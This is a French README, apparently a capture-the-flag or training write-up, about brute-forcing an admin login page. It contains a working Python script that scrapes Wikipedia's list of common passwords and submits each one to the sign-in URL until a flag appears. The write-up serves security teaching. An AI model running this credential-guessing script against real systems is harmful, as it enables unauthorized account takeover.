# README : Forçage de l'authentification du compte admin

## Description

Cette brèche met en évidence une vulnérabilité dans la gestion des mots de passe et l'authentification sur une application web. Elle utilise une approche non éthique mais démonstrative pour essayer de compromettre le compte admin.

## Fonctionnement

- Accédez à la page : `http://X.X.X.X/?page=signin`
- Utilisez un script Python qui tente l'authentification du compte admin avec les mots de passe les plus courants trouvés sur Wikipedia:

```python
import requests
from bs4 import BeautifulSoup

url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"

response = requests.get(url)

if response.status_code == 200:
    unique_strings = set()
    soup = BeautifulSoup(response.content, 'html.parser')
    tables = soup.find_all('table', class_='wikitable')

    for table in tables:
        caption = table.find('caption') # Optional: Keep track of caption
        rows = table.find_all('tr')
        if caption: # Optional: Check if caption exists
            for row in rows:
                tds = row.find_all('td')
                if len(tds) >= 2:
                    for td in tds[1:]:
                        actual_td = td.get_text(strip=True)
                        if actual_td not in unique_strings:
                            print(f"Actual password: {actual_td}")
                            unique_strings.add(actual_td)
                            request_url = f"http://X.X.X.X/?page=signin&username=admin&password={actual_td}&Login=Login"
                            response = requests.get(request_url)
                            if 'flag' in response.text:
                                print(f"Found 'flag' with password: {actual_td}")
                                for line in response.text.splitlines():
                                    if 'flag' in line:
                                        print("Line containing 'flag':", line)
                                exit()

```

- Validez l'authenfication avec le mot de passe trouvé

## Impact

Cette approche peut permettre à un attaquant de :

- Tenter de compromettre des comptes admin par force brute
- Potentiellement obtenir accès non autorisé à l'application
- Exposer des informations sensibles si le système n'est pas correctement sécurisé

## Recommandations

Pour corriger cette vulnérabilité :
Implémenter une authentification robuste avec des mots de passe forts et uniques pour chaque compte.
